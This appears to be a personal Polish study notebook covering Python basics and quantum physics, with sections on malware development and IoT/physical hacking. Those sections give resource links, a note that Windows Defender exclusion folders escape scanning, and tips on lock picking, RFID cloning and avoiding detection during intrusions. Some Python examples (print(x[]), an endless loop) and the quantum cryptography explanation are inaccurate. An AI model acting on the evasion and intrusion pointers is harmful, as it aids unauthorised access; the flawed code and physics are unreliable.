Można dokonać konwersji typu Konwersjai z jednego typu na inny za pomocą metod int(), float()i complex() przykłądowy kod:

```
x = 5
y = 20.49
z = 1j

a = float(x)

b = int(y)

c = complex(x)

print(a)
print(b)
print(c)

print(type(a))
print(type(b))
print(type(c))
```

wynik:
- 5.0
- 20
- (5+0j)
- <class 'float'>
- <class 'int'>
- <class 'complex'>

## Uwaga: Nie można konwertować liczb zespolonych na inny typ liczb.


**Liczba losowa**
Python nie ma random()funkcji tworzenia liczb losowych, ale Python ma wbudowany moduł o nazwie random, którego można użyć do tworzenia liczb losowych:

```
import random

print(random.randrange(1, 10))
```


Może się zdarzyć, że będziesz chciał określić typ zmiennej. Można to zrobić za pomocą castingu. Python jest językiem obiektowym i jako taki używa klas do definiowania typów danych, w tym typów pierwotnych.

Dlatego rzutowanie w Pythonie odbywa się za pomocą funkcji konstruktora:

int() - konstruuje liczbę całkowitą z literału całkowitego, literału zmiennoprzecinkowego (usuwając wszystkie miejsca dziesiętne) lub literału łańcuchowego (pod warunkiem, że ciąg reprezentuje liczbę całkowitą)
float() — konstruuje liczbę zmiennoprzecinkową z literału całkowitego, zmiennoprzecinkowego lub literału łańcuchowego (pod warunkiem, że ciąg reprezentuje liczbę zmiennoprzecinkową lub liczbę całkowitą)
str() - konstruuje ciąg znaków z szerokiej gamy typów danych, w tym ciągów znaków, literałów całkowitych i literałów zmiennoprzecinkowych np.

```
x = int(3)
y = int(2.3)
z = int("3")
```

tak samo by to wyglądało z float i str

do zmiennej można przypisać ciąg wielo liniowy za pomocą """ np:

```
x = """Lorem ipsum dolor sit amet,
consectetur adipiscing elit,
sed do eiusmod tempor incididunt
ut labore et dolore magna aliqua."""

print(x)
```
**Uwaga: w efekcie podziały wierszy wstawiane są w tym samym miejscu, co w kodzie.**

CIągi są tablicami

ciągi znaków w pythonie to tablice bajtów reprezentujące znaki unicode, jednak w py niema znakowanego typu danych znak to po prostu ciąg znakó o długości 1 kod:

```
x = "Hello World"
print(x[]) # odpowiedź będzie "H" czyli ten kod po prostu drukuje litere w zależności od wartości liczby jakby było np [1] to odp by była "e"
```

ponieważ ciahgi są tablicami można przechodzić przez ciągi za pomocą for pętli np kod:

```
for x in "banana":
    print(x)

Output:
b
a
n
a
n
a
```

funkcja len() zwraca długość ciągu kod:

```
x = "Hello World"
print(len(x))
```

Abt sprawdzić czy w danym ciągu występuje dana fraza bądź znak należy użyć funkcji in kod:

```
txt = "The best things in life are free!"
print("free" in txt) # output będzie True
```
Należy użyć instrukcji if dla 'customowej' odpowiedzi kod:

```
txt = "The best things in life are free"

if "free" in txt:
    print("Free is in the text")
```
	
instrukcja jeżeli nie jest:

```
txt = "The best things in life are free"

if "Other" not in txt:
    print("Other is not in the text")
```


przykładowy kod który w kółko wysyła "Test12":

```
txt = "Spam"

while "test" is not txt:
    print("Test12")
```
(while to pętla dlatego w ciągle wysyła ten tekst)

```
txt = "Hello World"
print(txt[:5])     #Ten kod wydrukuje pierwsze 5 liter
--------------------------------------------
  
 txt = "Hello World"
  print(txt[2:]) #Pobierze postać z pozycji 2 aż do końca
-------------------------------------------- 

txt = "Hello World" 
print(txt[-5:-2]) #Minusowe indeksowanie
--------------------------------------------

txt = "Hello World"
print(txt.upper()) #output to drukowane HELLO WORLD

--------------------------------------------
txt = "Hello World"
print(txt.lower()) # output same małe litery

--------------------------------------------
txt = "Hello World"
print(txt.strip()) #usuwa spacje zdrukowanego tekstu

--------------------------------------------
txt = "Hello World"
txt2 = txt.replace("H", "J")

print(txt2) # ten kod zmienia literę H na J

--------------------------------------------
a = "Hello, World!"
print(a.split(",")) #Dzieli ciąg na podciągi, jeżeli znajdzie występienie separatora, output: ['Hello', ' World!']


```

**Tego NIE robić**: age = 36
txt = "My name is John, I am " + age
print(txt)

Zamiast tego użyć funkcji 'format()'
Czyli np.

```
age = 30
txt = "My name is John, and I am {}"
txt2 = txt.format(age)

print(txt2)

"""
Ponieważ funkcja format() przyjmuję nieograniczoną liczbę argumentó i jest um ieszczona w odpowiednich symbolach zastępczych
"""
```
*wersja kilku liniowa funkcji format():*

```
item1 = 10
item2 = 10.29
item3 = 9

sum = "first price is {} second price is {} and third price is {}"

print(sum.format(item1, item2, item3))
```

Aby wstawić niedozwolony zan należy wstawić znak ucieczki czyli: \" znak uceczki umożliwia użycie podwójnych cudzysłowów gdy normalnie nie było by to możliwe.
np kod:

```
text = "Hello world it is a \"Testkodu\" Inny text"

print(text)
```

test jednoski kodu w pythonie (czyli kod napisany do przetestowania głównego kodu czy wszystko działa poprawnie)-  https://www.dataquest.io/blog/unit-tests-python/

ten kod najpierw pyta jak sie nazywam, a po wpisaniu odpowiada "Hello nazwa":

```
name = input("Whats your name? ")
print("hello, " + name)
```

inny rodzaj :

```
name = input("Whats your name? ")

print("hello, ", end="[CHEF] ")
print(name)
```

lepsza wersja (strip usuwa pustą powieszchnie na początku i końcu a title automattycznie wstawia dużo litere przy imieniu i nazwisko po odpowiedzi) kod:

kod który włącza kamerę: 
```
import cv2

# Otwórz strumień wideo z kamery
cap = cv2.VideoCapture(0)

while(True):
    # Przechwytuj klatkę po klatce
    ret, frame = cap.read()

    # Nasze operacje na ramce tutaj
    gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)

    # Wyświetl wynikową klatkę
    cv2.imshow('frame',gray)
    
    # Jeśli naciśniesz 'q', pętla się zakończy
    if cv2.waitKey(1) & 0xFF == ord('q'):
        break

# Po skończeniu zwolnij uchwyt do przechwytywania
cap.release()
cv2.destroyAllWindows()
```


**Uwaga: Wszystkie metody łańcuchowe zwracają nowe wartości. Nie zmieniają oryginalnego ciągu.**

![e529a22831f8993e36f4d932fae2f37f.png](:/2f477d064cf04cc5bb77ad70d974db34)


kiedy uruchamiasz instrukcję w if odp będzie True or False kod:

```
a = 2093
b = 393

if b > a:
    print("b is greater then a")
	
else:
    print("b is not greater")
```
	
	
x = int(input("Whats x? ")) # dzięki int liczby się dodadzą w sposób matematyczny, ponieważ bez tego wynik byłoby dodaniem liczby np. 2 + 1 wynik byłby 21
y = int(input("Whats y? "))

print(x + y) 

w pythonie pętla for jest używana do określenia ile razy ma się powrurzyć np: 
```
for i in range(6):
    print(i)
```
	
	
kod który wygeneruje tekst tyle razy na ile jest pomnożony:
```
var = "John\n" * 2 * 3
print(var) # W tym przypadku 6
```

Funkcja bool jest wstanie ocenić dowolną wartość i dać w zamian True lub False kod:
```
print(bool("Hello World"))
print(bool("15"))
```

Niemal wszystko jest True z wyjątkiem pustych, oraz 0

Można tworzyć funkcje zwracające wartość logiczną kod:

```
def myfunc() :
    return True
	
print(myfunc())
```

lub 
```
def myFunction() :
  return True

if myFunction():
  print("YES!")
else:
  print("NO!")
```

python też ma wiele wbudowanych funkcji logicznych np. "isinstance" kod z użyciem tego:

```
x = 200
print(isinstance(x, int)) #Output True ponieważ 200 to int
```


Python dzieli operatory na następujące grupy:

Operatory arytmetyczne
Operatory przypisania
Operatory porównania
Operatory logiczne
Operatory tożsamości
Operatorzy członkostwa
Operatory bitowe

![633958fd9dd5fa46066986aceca8c680.png](:/0f5a8266d5a14d00981ee942255ae3f4)

listy służą do przechowywania, wielu elementów w 1 zmiennej

mylist = ['Apple', 'Banana', 'Somthing']
print(mylist)

listy to 1 z 4 typów do przechowywania kolekcji danych innę to: Tuple, Set, Disctionary, i wszystkie mają inną jakość i zastosowanie, listy tworrzy się za pomocą nawiasów [].

elementy listy mogą mieć dowolny typ danych.

list = ["Charry", "Banana", "Milk"]
print(len(list))



**Python Collections (Arrays)**
There are four collection data types in the Python programming language:

List is a collection which is ordered and changeable. Allows duplicate members.
Tuple is a collection which is ordered and unchangeable. Allows duplicate members.
Set is a collection which is unordered, unchangeable*, and unindexed. No duplicate members.
Dictionary is a collection which is ordered** and changeable. No duplicate members.

*Set items are unchangeable, but you can remove and/or add items whenever you like.

**As of Python version 3.7, dictionaries are ordered. In Python 3.6 and earlier, dictionaries are unordered.
Wybierając typ kolekcji, warto poznać właściwości tego typu. Wybór odpowiedniego typu dla konkretnego zbioru danych może oznaczać zachowanie znaczenia, a także wzrost wydajności lub bezpieczeństwa.
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Malware Development

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Folder wykluczeń WD to folder wykluczeń programu Windows Defender, w którym obrońca systemu Windows i garstka innych AV nie będą skanować wybranych lokalizacji

exploit UAC - kontrola konta użytkownika
https://www.vx-underground.org/

szyfrowanie TLS

nauka ----->              https://filesec.io/
                          https://malapi.io/
			  https://lots-project.com/
			  https://mrd0x.com/
			  https://twitter.com/mrd0x
			  https://www.sektor7.net/
			  https://www.youtube.com/c/meetsektor7
     ------>

 wirus - https://zh.wikipedia.org/wiki/%E6%9C%BA%E5%99%A8%E7%8B%97_(%E7%94%B5%E8%84%91%E7%97%85%E6%AF%92)
 
 https://medium.com/@theCTIGuy/the-5-best-books-for-malware-development-105e3aaec2df
 
 https://blogs.vmware.com/security/2021/03/memory-forensics-for-virtualized-hosts.html
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Hakowanie IOT i rzeczy fizyczne

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
USZKODZENIE UPRZYWILEJOWANYCH POCISKÓW (GITCHING INTO PRIVILEGED SHELLS):

https://www.exploitee.rs/ 

https://blog.exploitee.rs/

https://github.com/nebgnahz/awesome-iot-hacks#analysis-reports-and-slides

zhakowanie świateł przejazdu - https://ioactive.com/hacking-us-and-uk-australia-france-etc/

https://www.infiltratecon.com/info/archives.html#

https://github.com/CyberSecurityUP/Awesome-Hardware-and-IoT-Hacking

https://github.com/daniellowrie/IoT-Hacking-Resources

https://github.com/ahmedalroky/IOT-hacking-Roadmap

Physical hackers, also known as penetration testers or ethical hackers specializing in physical security, face unique challenges due to the hands-on and often unpredictable nature of their work. Here are some common challenges they might encounter and potential ways to overcome them:

Legal and Ethical Boundaries:

Challenge: Physical hacking activities can easily cross legal and ethical boundaries, especially if conducted without proper authorization.
Solution: Obtain explicit permissions from the property owner or organization before attempting any physical hacks. Adhere to ethical guidelines and local laws to ensure your actions remain legal and responsible.
Physical Access and Security Measures:

Challenge: Gaining physical access to a target can be difficult due to security measures like locks, keycards, and biometric systems.
Solution: Develop skills in lock picking, bypassing access controls, and cloning RFID cards. Invest time in learning about common physical security vulnerabilities and techniques to exploit them.
Risk of Detection:

Challenge: Physical hackers risk detection during their activities, which can lead to legal consequences or a compromised mission.
Solution: Plan and execute hacks carefully, minimize suspicious behavior, and use disguises or pretexting techniques to blend in. Develop a solid exit strategy in case of detection.
Unpredictable Environments:

Challenge: Physical hacking often occurs in dynamic, real-world environments where conditions can change rapidly.
Solution: Adaptability is key. Practice improvisation and quick thinking. Develop skills in on-the-fly decision-making to handle unexpected challenges.
Physical Skills Development:

Challenge: Mastering skills like lock picking or manipulating physical devices requires time, practice, and patience.
Solution: Regular practice and training are crucial. Join lock-picking clubs, attend workshops, and seek mentorship to accelerate your skill development.
Concealing Intentions:

Challenge: Successfully social engineering your way into a secure area without raising suspicions can be difficult.
Solution: Study human behavior, body language, and communication techniques. Build rapport and trust with personnel to increase the chances of successful social engineering.
Documentation and Reporting:

Challenge: Accurately documenting physical hacks and vulnerabilities can be challenging due to the need for clear, detailed reporting.
Solution: Develop strong documentation skills. Take notes, photos, and videos during your activities. Provide comprehensive reports to clients or employers, detailing your findings and recommended mitigations.
Physical Safety:

Challenge: Physical hacking may involve risks to your personal safety, especially in unfamiliar or potentially dangerous environments.
Solution: Prioritize personal safety above all else. Conduct thorough risk assessments before attempting any physical hacks. Avoid situations where safety is compromised.
Client Expectations:

Challenge: Meeting client expectations and understanding their specific needs can be challenging.
Solution: Establish clear communication with clients before beginning any engagement. Understand their goals, objectives, and desired outcomes. Provide regular updates and maintain open lines of communication throughout the process.
By recognizing and addressing these challenges, physical hackers can enhance their skills, conduct effective penetration tests, and contribute to improving overall security measures.

Definition and Scope of Physical Hacking:
Physical hacking refers to the deliberate and unauthorized manipulation of physical systems, devices, or infrastructure to gain unauthorized access, extract sensitive information, or compromise security. It involves exploiting vulnerabilities in physical security measures, often through a combination of technical skills, social engineering, and manipulation of hardware components. The scope of physical hacking encompasses a wide range of targets, including but not limited to, buildings, access control systems, RFID systems, locks, surveillance systems, and physical infrastructure.

Common Techniques in Physical Hacking:
Physical hacking techniques vary based on the target and objectives. Common techniques include lock picking, bypassing access controls, exploiting weaknesses in alarm systems, tampering with surveillance cameras, cloning RFID cards, and social engineering to manipulate individuals into revealing confidential information or granting unauthorized access.

Examples of Real-World Physical Hacking Incidents:
A notable example is the "DEFCON 22 Badge Challenge," where hackers infiltrated a conference badge's electronics to access hidden features, demonstrating the vulnerabilities of connected devices. Another incident involved the hacking of hotel room locks, highlighting the potential weaknesses in hotel security systems.

Tools and Equipment Used by Physical Hackers:
Physical hackers employ an array of tools, such as lock picks, tension wrenches, bump keys, RFID cloners, signal amplifiers, and surveillance camera disablers. These tools aid in circumventing physical security measures and gaining unauthorized access.

Resources and References for Learning Physical Hacking:

Book: "Practical Lock Picking" by Deviant Ollam
Online Communities: Toool (The Open Organization of Lockpickers), Reddit's r/physec
Workshops and Conferences: DEFCON's "Lockpick Village"
Ethical Considerations and Legal Implications:
Ethical concerns surround the potential for harm, unauthorized access, and invasion of privacy. Laws, regulations, and guidelines vary by jurisdiction and may impact physical hacking activities. Ethical hacking frameworks, like those defined by EC-Council and CompTIA, emphasize responsible and legal practices.

Countermeasures and Security Measures:
To mitigate physical hacking risks, organizations should implement layered security measures:

Access controls: Strong authentication and authorization protocols.
Surveillance: Monitoring and recording of critical areas.
Security audits: Regular assessments of physical security measures.
Employee training: Educating staff about social engineering and security awareness.
Emerging Trends and Advancements:
Emerging trends include the integration of physical and digital hacking, such as combining RFID cloning with network attacks to breach secure environments. Advancements in IoT and smart devices introduce new vectors for physical hacking.

Enhancing Physical Security Measures:
Organizations can enhance physical security by adopting multifactor authentication, implementing biometric systems, conducting regular security audits, and fostering a security-conscious culture among employees.

Impact on Critical Infrastructure:
Physical hacking can have severe repercussions on critical infrastructure, disrupting operations, compromising sensitive data, and posing risks to public safety. For instance, a successful attack on power plants or transportation systems could lead to widespread chaos.
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------



# Mechanika, Fizyka i kryptografia kwantowa:
**Czym są czujniki kwantowe**?
Czujniki kwantowe to pojedyncze systemy lub zespoły systemów, które wykorzystują spójność kwantową, interferencję i splątanie do określenia wielkości fizycznych będących przedmiotem zainteresowania.

https://youtu.be/CpOofKV5WR0

Kwark – cząstka elementarna, fermion mający ładunek kolorowy. Według obecnej wiedzy cząstki elementarne będące składnikami materii można podzielić na dwie grupy. Pierwszą grupę stanowią kwarki, drugą grupą są leptony.

Mechanika kwantowa jest gałęzią fizyki . Opisuje naturalne zachowanie w skali atomowej i poniżej. Stanowi podstawę całej fizyki kwantowej , w tym chemii kwantowej , kwantowej teorii pola , technologii kwantowej i informatyki kwantowej .

Termin "kwantowy" w kontekście kwantowych komputerów pochodzi bezpośrednio z dziedziny mechaniki kwantowej, która jest działem fizyki opisującym zjawiska zachodzące na poziomie cząsteczkowym i atomowym. Istnieje ścisłe powiązanie pomiędzy kwantowymi komputerami a mechaniką kwantową.

W mechanice kwantowej, cząstki elementarne, takie jak elektrony, fotony i inne, wykazują zarówno cechy falowe, jak i korpuskularne. Jedną z kluczowych koncepcji jest superpozycja kwantowa, która oznacza, że cząstka może znajdować się w wielu stanach jednocześnie, dopóki nie zostanie zmierzona. Po pomiarze cząstka "zapada" się w jeden ze stanów, tracąc superpozycję.

Kwantowe komputery wykorzystują ten fenomen superpozycji kwantowej oraz inne zasady mechaniki kwantowej, takie jak splątanie kwantowe, do przeprowadzania obliczeń. W przeciwieństwie do klasycznych komputerów, które operują na bitach przyjmujących wartości 0 lub 1, kwantowe komputery używają kubitów (quantum bits), które mogą być w superpozycji stanów 0 i 1 jednocześnie.

Dzięki superpozycji kwantowej, kubity mogą reprezentować wiele wartości równocześnie, co pozwala kwantowym komputerom na przeprowadzanie obliczeń równoległych na ogromną skalę. To z kolei umożliwia rozwiązywanie niektórych problemów obliczeniowych znacznie szybciej niż na klasycznych komputerach.

Ponadto, zjawisko splątania kwantowego, w którym stan jednej cząstki kwantowej jest powiązany z inną cząstką, nawet jeśli są one oddzielone przestrzennie, odgrywa kluczową rolę w kwantowych algorytmach i protokołach kryptograficznych.

Kwantowe komputery bezpośrednio wykorzystują prawa i zjawiska mechaniki kwantowej do przeprowadzania obliczeń w sposób, który jest niemożliwy do osiągnięcia w klasycznych systemach komputerowych. Dlatego określenie "kwantowy" jest tak istotne w kontekście tych innowacyjnych maszyn obliczeniowych.

-------------------------------------------------------------------------------------------------------------------------
# Kryptografia kwantowa:

Co to jest kryptografia kwantowa?

Kryptografia kwantowa, znana również jako kwantowa dystrybucja klucza (QKD), to metoda bezpiecznej komunikacji wykorzystująca zasady mechaniki kwantowej do kodowania i dekodowania wiadomości. Został zaprojektowany, aby zapewnić bezwarunkowe bezpieczeństwo, co oznacza, że ??każda próba podsłuchania lub przechwycenia komunikacji zostanie wykryta.

Jak to działa?

Kwantowa dystrybucja klucza (QKD) : Dwie strony, tradycyjnie określane jako Alicja i Bob, chcą ustanowić bezpieczny kanał komunikacji. Każdy z nich ma układ kwantowy, taki jak foton, który jest splątany (połączony) w sposób umożliwiający ich korelację.
Szyfrowanie kwantowe : Alicja i Bob szyfrują swoje wiadomości na fotonach, korzystając z procesu zwanego szyfrowaniem kwantowym. Tworzy to zaszyfrowany klucz, który służy do szyfrowania i deszyfrowania komunikacji.
Pomiar : podczas pomiaru fotonów korelacja między splątanymi cząsteczkami zostaje zakłócona, co utrudnia podsłuchiwaczowi (Ewie) przechwycenie komunikacji bez wykrycia.
Wymiana kluczy : Alicja i Bob publicznie porównują swoje pomiary, aby upewnić się, że klucze są identyczne. Jeśli klucze pasują, mogą ich użyć do szyfrowania i deszyfrowania komunikacji.

Kluczowe idee:
Splątanie : zjawisko, w którym dwie lub więcej cząstek łączy się w taki sposób, że ich właściwości są skorelowane, niezależnie od odległości między nimi.
Superpozycja : stan kwantowy, w którym cząstka może istnieć w wielu stanach jednocześnie.
Pomiar : proces obserwacji układu kwantowego, który może spowodować zapadnięcie się układu w jeden stan.
Podsłuchiwanie: czynność przechwytywania i analizowania komunikacji bez wiedzy i zgody zaangażowanych stron.

Korzyści i zastosowania:
Bezwarunkowe bezpieczeństwo : kryptografia kwantowa zapewnia najwyższy poziom bezpieczeństwa, ponieważ każda próba podsłuchu zostanie wykryta.
Bezpieczna komunikacja : QKD może być używany do bezpiecznej komunikacji za pośrednictwem kanałów publicznych, takich jak Internet.
Szybki transfer danych : QKD może być używany do szybkiego przesyłania danych, dzięki czemu nadaje się do zastosowań takich jak transakcje finansowe i przesyłanie wrażliwych danych.
Bezpieczne systemy głosowania : QKD można wykorzystać do tworzenia bezpiecznych systemów głosowania, zapewniających integralność wyborów.

Wyzwania i ograniczenia:
Ograniczenia odległości : Odległość, na jaką można zastosować QKD, jest ograniczona ze względu na tłumienie fotonów w kablach światłowodowych.
Korekcja błędów : QKD wymaga złożonych mechanizmów korekcji błędów, aby zapewnić integralność zaszyfrowanych danych.
Skalowalność : Obecnie QKD nie jest skalowalny do zastosowań na dużą skalę ze względu na złożoność i koszt technologii.

Zastosowania w świecie rzeczywistym:
Bezpieczna komunikacja : QKD jest używany do bezpiecznej komunikacji w różnych branżach, takich jak finanse, opieka zdrowotna i rząd.
Bezpieczne systemy głosowania : QKD jest badane pod kątem bezpiecznych systemów głosowania, aby zapewnić integralność wyborów.
Bezpieczny transfer danych : QKD jest używany do bezpiecznego przesyłania danych w aplikacjach takich jak transakcje finansowe i przesyłanie wrażliwych danych.

-------------------------------------------------------------------------------------------------------------------------

Antymateria – układ antycząstek. Antycząstki to cząstki elementarne podobne do występujących w „zwykłej” materii, ale o przeciwnym znaku ładunku elektrycznego oraz wszystkich addytywnych liczb kwantowych. W momencie kontaktu antymaterii z materią obie ulegają anihilacji.

Antycząstką elektronu jest - pozyton

Twierdzenie Bella (zwane też nierównością Bella) – twierdzenie dotyczące mechaniki kwantowej, pokazujące, w jaki sposób przewidywania mechaniki kwantowej różnią się od klasycznej intuicji. Jego autorem jest północnoirlandzki fizyk John Stewart Bell. Można je sformułować następująco:

"Żadna lokalna teoria zmiennych ukrytych nie może opisać wszystkich zjawisk mechaniki kwantowej." <-- Sformułował on to twierdzenie w 1964R.

Przejście między stanami: W mechanice klasycznej, obiekt może znajdować się w dowolnym stanie i jego ruch można łatwo przewidzieć, gdy tylko zostanie określony jego początkowy stan. W mechanice kwantowej, obiekt może znajdować się tylko w określonych stanach kwantowych.

Akcelerator – urządzenie służące do przyspieszania cząstek elementarnych lub jonów do prędkości bliskich prędkości światła w próżni. Cząstki obdarzone ładunkiem elektrycznym są przyspieszane w polu elektrycznym.

Cząstką elementarną jest foton.

Dylatacja czasu to efekt relatywistyczny, w którym upływ czasu wydaje się wolniejszy dla obiektów poruszających się z dużymi prędkościami względem obserwatora.

Wzór na długość fali de Broglie'a (? = h/p), który opisuje falową naturę cząstek materialnych.

fale w mechanice kwantowej jako fale prawdopodobieństwa, które opisują prawdopodobieństwo znalezienia cząstki w danym miejscu i czasie.
Louisa de Broglie'a i jego wkład
Teoria wielu światów, zakłada brak kolapsu funkcji falowej i istnienie wieloświata, gdzie realizują się wszystkie możliwe wyniki pomiarów.

Pojęcie przestrzeni Hilberta jest abstrakcyjną przestrzenią matematyczną, w której "żyją" stany kwantowe.
(Przestrzeń Hilberta to abstrakcyjna przestrzeń matematyczna, która stanowi fundament mechaniki kwantowej. Nie jest to przestrzeń fizyczna, którą możemy sobie wyobrazić w trzech wymiarach, lecz raczej przestrzeń matematyczna, w której "żyją" stany kwantowe.)

Można wyobrazić sobie to tak:
Klasyczna przestrzeń: W fizyce klasycznej, stan obiektu opisujemy za pomocą jego położenia i pędu w przestrzeni trójwymiarowej.
Przestrzeń Hilberta: W mechanice kwantowej, stan układu kwantowego (np. elektronu) jest opisywany przez wektor w przestrzeni Hilberta.
Kluczowe cechy przestrzeni Hilberta:
Abstrakcyjność: Nie jest to przestrzeń fizyczna, ale matematyczna, zdefiniowana przez aksjomaty.
Wektory stanu: Każdy punkt w przestrzeni Hilberta reprezentuje możliwy stan układu kwantowego.
Superpozycja: Układ kwantowy może znajdować się w superpozycji stanów, co oznacza, że jego wektor stanu jest kombinacją liniową wektorów opisujących poszczególne stany.
Produkt skalarny: Przestrzeń Hilberta jest wyposażona w iloczyn skalarny, który pozwala obliczyć prawdopodobieństwo przejścia układu z jednego stanu do drugiego.
Przykłady zastosowania:
Opis stanów kwantowych: Funkcja falowa, opisująca stan cząstki w mechanice kwantowej, jest wektorem w przestrzeni Hilberta.
Ewolucja układów kwantowych: Zmiany stanu układu kwantowego w czasie są opisywane przez operatory działające na wektory w przestrzeni Hilberta.
Teoria wielu światów: W tej interpretacji mechaniki kwantowej, każde rozgałęzienie wszechświata odpowiada rozdzieleniu ścieżek w przestrzeni Hilberta.
Podsumowując:
Przestrzeń Hilberta to potężne narzędzie matematyczne, które pozwala opisać i zrozumieć dziwny i fascynujący świat mechaniki kwantowej. Choć jej abstrakcyjność może wydawać się trudna do pojęcia, to jest ona niezbędna do zrozumienia fundamentalnych zasad rządzących zachowaniem cząstek elementarnych).

Aksjomaty to podstawowe, niedefiniowane pojęcia i zdania, które przyjmuje się bez dowodu w ramach danej teorii matematycznej lub logicznej. Stanowią one fundament, na którym buduje się całą resztę teorii, poprzez definiowanie nowych pojęć i wyprowadzanie twierdzeń na podstawie przyjętych aksjomatów i reguł wnioskowania.
Można myśleć o nich jak o regułach gry, które ustala się na samym początku, aby zapewnić spójność i logiczny porządek.

Kluczowe cechy aksjomatów:
Niedowodliwość: Aksjomatów nie dowodzi się w ramach danej teorii. Przyjmuje się je jako punkt wyjścia.
Niewyprowadzalność: Aksjomatów nie da się wyprowadzić z innych zdań w ramach danej teorii.
Spójność: Zbiór aksjomatów powinien być spójny, tzn. nie powinien prowadzić do sprzeczności.
Minimalność: Zbiór aksjomatów powinien być minimalny, tzn. żaden aksjomat nie powinien być zbędny i dać się wyprowadzić z pozostałych.
Przykłady aksjomatów:
Geometria euklidesowa: Aksjomat o prostych równoległych ("Przez punkt leżący poza prostą można poprowadzić tylko jedną prostą równoległą do danej prostej").
Teoria mnogości: Aksjomat wyboru ("Dla każdego zbioru niepustych zbiorów istnieje funkcja, która z każdego zbioru wybiera jeden element").
Znaczenie aksjomatów:
Podstawa dla teorii: Aksjomaty stanowią fundament, na którym opiera się cała teoria.
Zapewnienie spójności: Aksjomaty gwarantują, że teoria jest spójna i logicznie uporządkowana.
Możliwość rozwoju: Przyjęcie określonych aksjomatów otwiera drogę do definiowania nowych pojęć i wyprowadzania twierdzeń.
Ciekawostka:
W przeszłości uważano, że aksjomaty to "oczywiste prawdy", które nie wymagają dowodu. Jednak rozwój matematyki pokazał, że aksjomaty to raczej wybory, których dokonujemy, aby stworzyć spójny system logiczny.

Wyobraź sobie, że energia nie jest ciągła, jak płynąca woda, ale podzielona na dyskretne pakiety, jak oddzielne krople. Każdy z tych pakietów to właśnie kwant.
To pojęcie oznacza, że energia, pęd, moment pędu i inne wielkości fizyczne mogą przyjmować tylko określone, dyskretne wartości, a nie dowolne wartości w ciągłym zakresie.
Analogia:
Wyobraź sobie schody. Nie możesz stanąć między stopniami, tylko na konkretnym stopniu. Podobnie energia w świecie kwantowym "skacze" między określonymi poziomami, a każdy skok to kwant energii.
Przykład:
Światło składa się z kwantów zwanych fotonami. Każdy foton niesie określoną ilość energii, która zależy od jego częstotliwości.
Zrozumienie kwantu jest kluczem do zrozumienia wielu zjawisk kwantowych, takich jak efekt fotoelektryczny, widmo atomowe czy promieniowanie ciała doskonale czarnego.

Antycząstki to jeden z najbardziej intrygujących aspektów fizyki cząstek elementarnych.
Wyobraź sobie, że każda cząstka elementarna ma swoje "lustrzane odbicie" - antycząstkę.
Czym się różnią?
Antycząstka ma takie same właściwości fizyczne jak cząstka, z wyjątkiem ładunku elektrycznego, który jest przeciwny. Na przykład, elektron ma ładunek ujemny (-1), a jego antycząstka, pozyton, ma ładunek dodatni (+1).
Co się dzieje, gdy cząstka spotka swoją antycząstkę?
Wtedy następuje **anihilacja**, czyli proces, w którym obie cząstki znikają, a ich masa zostaje przekształcona w energię w postaci fotonów.
Przykłady antycząstek:
- Pozyton (e+): Antycząstka elektronu.
- Antyproton (pŻ): Antycząstka protonu.
- Antineutron (nŻ): Antycząstka neutronu.

Gdzie możemy znaleźć antycząstki?
Antycząstki są rzadkie w naszym codziennym życiu, ale można je wytworzyć w akceleratorach cząstek, gdzie cząstki są przyspieszane do bardzo wysokich prędkości i zderzane ze sobą.

Zastosowania antycząstek:
Antycząstki mają wiele potencjalnych zastosowań, takich jak:
Medycyna: Pozytony są wykorzystywane w tomografii pozytonowej (PET), metodzie obrazowania medycznego.
Energetyka: Antymateria jest potencjalnym źródłem energii o bardzo wysokiej gęstości.

Akcelerator cząstek to rodzaj gigantycznej maszyny, która przyspiesza cząstki elementarne do niemalże prędkości światła. Wyobraź sobie go jak super-mikroskop, który pozwala nam "zobaczyć" świat na poziomie subatomowym.

Jak działa?
Akcelerator wykorzystuje pola elektromagnetyczne do przyspieszania cząstek wzdłuż określonej trajektorii. Cząstki poruszają się w próżni, pokonując coraz szybsze okrężne tory, aż osiągną pożądaną energię.

Do czego służy?
Akceleratory cząstek są wykorzystywane do:
Badania struktury materii: Zderzenia cząstek o wysokiej energii pozwalają nam "rozbić" atomy na ich składniki i zbadać ich właściwości.
Odkrywania nowych cząstek: W zderzeniach cząstek mogą powstawać nowe, nieznane dotąd cząstki elementarne.

Testowania teorii fizycznych: Akceleratory pozwalają nam testować przewidywania teorii fizycznych, takich jak Model Standardowy.

Zastosowań medycznych: Akceleratory są wykorzystywane w radioterapii nowotworów.

Przykłady akceleratorów:
LHC (Large Hadron Collider) w CERNie - największy akcelerator na świecie. Oraz
"Fermilab Tevatron" w USA.

